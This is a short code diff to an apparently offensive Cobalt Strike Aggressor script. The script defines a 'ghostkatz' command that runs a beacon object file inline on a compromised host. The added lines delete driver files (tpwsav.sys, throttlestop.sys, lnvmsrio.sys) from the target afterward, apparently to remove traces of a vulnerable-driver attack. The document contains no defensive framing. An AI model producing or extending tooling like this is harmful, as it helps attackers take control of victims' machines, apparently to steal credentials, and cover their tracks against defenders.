@@ -80,4 +80,17 @@ alias ghostkatz {
     # Prepare the arguments
     $args = bof_pack($1, "ziz", $providerArg, $providerNum, $mode);
     beacon_inline_execute($1, $bof, "go", $args); # $args
+
+	if ($providerNum == 1)
+	{
+		brm($1, "tpwsav.sys");
+	}
+	else if ($providerNum == 2)
+	{
+		brm($1, "throttlestop.sys");
+	}
+	else if ($providerNum == 3)
+	{
+		brm($1, "lnvmsrio.sys");
+	}
 }
